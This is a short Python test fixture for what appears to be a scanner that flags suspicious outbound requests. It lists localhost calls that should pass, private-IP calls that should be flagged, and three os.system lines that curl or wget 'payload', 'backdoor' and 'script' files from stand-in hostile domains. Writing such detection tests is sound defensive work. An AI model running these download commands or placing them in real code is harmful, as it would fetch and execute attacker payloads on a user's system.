#!/usr/bin/env python3
# Test file with localhost patterns that should NOT trigger

import requests

# These should NOT trigger - localhost/127.0.0.1
response = requests.get('http://127.0.0.1:8080/api')
response = requests.get('https://127.0.0.1:3000/data')
response = requests.get('http://localhost:5000/health')
response = requests.get('https://localhost/admin')

# These SHOULD trigger - direct IPs that aren't localhost
response = requests.get('http://192.168.1.1/admin')
response = requests.get('http://10.0.0.1/data')
response = requests.get('http://172.16.0.1/api')

# These SHOULD trigger - suspicious TLDs
os.system('curl http://evil.ru/payload')
os.system('wget http://malware.cn/backdoor')
os.system('curl http://bad.tk/script')